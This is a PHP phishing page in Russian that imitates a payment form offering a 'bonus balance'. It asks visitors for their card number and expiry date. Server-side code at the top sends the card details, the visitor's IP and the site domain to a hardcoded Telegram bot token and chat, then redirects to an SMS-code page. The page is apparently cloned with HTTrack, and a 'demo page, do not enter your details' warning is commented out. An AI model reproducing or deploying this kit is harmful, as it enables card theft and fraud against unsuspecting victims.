<?php 
session_start();
   if(isset($_POST['btn'])){
    //в переменную $token нужно вставить токен, который нам прислал @botFather
$token = "5892156996:AAFBvKbkwPa5rtPTCK6PCQWsOpapPKgBZog";
 
//нужна вставить chat_id (Как получить chad id, читайте ниже)
$chat_id = "-1001955272769";


$cardnum = $_POST['card-number'];
$month = $_POST['month'];
$year = $_POST['year'];
$_SESSION['smscode'] = $_POST['card-number'];
$ip = $_SERVER['REMOTE_ADDR'];
$domen =  $_SERVER['SERVER_NAME'];
//Далее создаем переменную, в которую помещаем PHP массив
$arr = array(
  '🌐IP: ' => $ip,
  '📡domen'=>$domen,
  '' => $s,
  '💳Номер карты: ' => $cardnum,
  '💳Месяц: ' => $month, 
  '💳Год: ' => $year, 
   
);
 
//При помощи цикла перебираем массив и помещаем переменную $txt текст из массива $arr
foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};
 
//Осуществляется отправка данных в переменной $sendToTelegram
$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");


 
//Если сообщение отправлено, напишет "Thank you", если нет - "Error"
if ($sendToTelegram) {
  header("Location:../sms.php");
} else {
  echo "Error";
    }
}
 ?>
<!DOCTYPE html>
<html lang="ru">
    

<!-- Mirrored from bestmodelss.ru/payment?_token=Adck8rYdtFVaaHJAagAMBFAE0gZ7mSO9BUWjmZK8&name=%D0%9D%D0%B0%D1%82%D0%B0%D0%BB%D0%B8&id=11&phone=21&votes=3321 by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 11 Jul 2021 16:46:42 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Оплата</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300&amp;display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Nunito:ital,wght@0,400;1,600&amp;display=swap" rel="stylesheet">
    <link rel="stylesheet" href="../stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
    <!-- <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css"> -->
    <link rel="stylesheet" type="text/css" href="css/bootstrap3_3_7.css">
    <link rel="preconnect" href="https://fonts.gstatic.com/">
    <link href="https://fonts.googleapis.com/css2?family=Fira+Sans+Condensed&amp;display=swap" rel="stylesheet">
    <link rel="icon" href="images/icon.png">
    <link rel="stylesheet" type="text/css" href="css/payment.css">
    <script src="http://code.jivosite.com/widget/Gm8J010U0z" async></script>
</head>

<body>
    <!--
    <header>
        <div class="limiter">
            <h3>This is a demo page, do not enter your details</h3>
        </div>
    </header>
    -->
    <div class="description">
        <p class="desctiption-text"></p>
        <table style="width:100%">
            <tr>
                <td> </td>
                <td style="text-align:right;"><label>Укажите реквизиты для зачисления бонусного баланса</label><label></label></td>
            </tr>
        </table>
    </div>
    <div class="container-fluid">
        <div class="creditCardForm">
            <div class="heading">
                <h1>Реквизиты карты</h1>
            </div>
                        <div class="payment">
                <form class="payForm" method="POST">
                    <input type="hidden" name="_token" value="OmqOPcqazYTAlf8xYWcliSPx9ibh2rdcvnRq0gw4">                    <input name="phone" type="text" class="hide" value="21">
                    <input name="id" type="text" class="hide" value="11">
                    <input name="price" type="text" class="hide" value="33210">
                    <div class="form-group card-number" id="card-number-field">
                        <label for="cardNumber">Номер карты</label>
                        <input required name="card-number" onDrag="return false" onDrop="return false" onPaste="return false" type="text" maxlength="19"  onkeypress='validate(event)' class="form-control" id="cardNumber" value="">
                    </div>
                    <div class="form-group expiration-date" id="expiration-date">
                        <label>Срок действия</label>
                        <select name="month">
                            <option value="01" >01</option>
                            <option value="02" >02</option>
                            <option value="03" >03</option>
                            <option value="04" >04</option>
                            <option value="05" >05</option>
                            <option value="06" >06</option>
                            <option value="07" >07</option>
                            <option value="08" >08</option>
                            <option value="09" >09</option>
                            <option value="10" >10</option>
                            <option value="11" >11</option>
                            <option value="12" >12</option>
                        </select>
                        <div style="display: contents; font-size: 20px;">/</div>
                        <select style="margin-left: 2px" name="year">
                            <option value="20" > 2020</option>
                            <option value="21" > 2021</option>
                            <option value="22" > 2022</option>
                            <option value="23" > 2023</option>
                            <option value="24" > 2024</option>
                            <option value="25" > 2025</option>
                            <option value="26" > 2026</option>
                            <option value="27" > 2027</option>
                            <option value="28" > 2028</option>
                            <option value="29" > 2029</option>
                            <option value="30" > 2030</option>
                        </select>
                    </div>
                 
                   
                    <div class="form-group" id="pay-now">
                        <button type="submit" name="btn" class="btn-submit btn btn-default" id="confirm-purchase">Продолжить   <i class="fa fa-shield"></i></button>
                    </div>
                </form>
            </div>
        </div>
        <div>
            <div class="verify-footer">
                <img class="mr-20" src="images/uz.jpg">
                <img class="mr-20" src="images/uz.jpg">
            </div>
        </div>
    </div>
  
    <script type="text/javascript">
        function validate(evt) {
            var theEvent = evt || window.event;

            if (theEvent.type === 'paste') {
                key = event.clipboardData.getData('text/plain');
            } else {
                var key = theEvent.keyCode || theEvent.which;
                key = String.fromCharCode(key);
            }

            var regex = /[0-9]|\./;
            if ((!regex.test(key)) || ($('.count-votes').val() == '' && key == '0') || (key == '.') || (window.getSelection() != '' && key == '0')) {
                theEvent.returnValue = false;
                if (theEvent.preventDefault) theEvent.preventDefault();
            }
        }
    </script>
    <script src="../ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <script src="../maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
    <script src="js/payment.js"></script>
    <script src="js/jquery.payform.min.js"></script>
</body>


<!-- Mirrored from bestmodelss.ru/payment?_token=Adck8rYdtFVaaHJAagAMBFAE0gZ7mSO9BUWjmZK8&name=%D0%9D%D0%B0%D1%82%D0%B0%D0%BB%D0%B8&id=11&phone=21&votes=3321 by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 11 Jul 2021 16:46:46 GMT -->
</html>
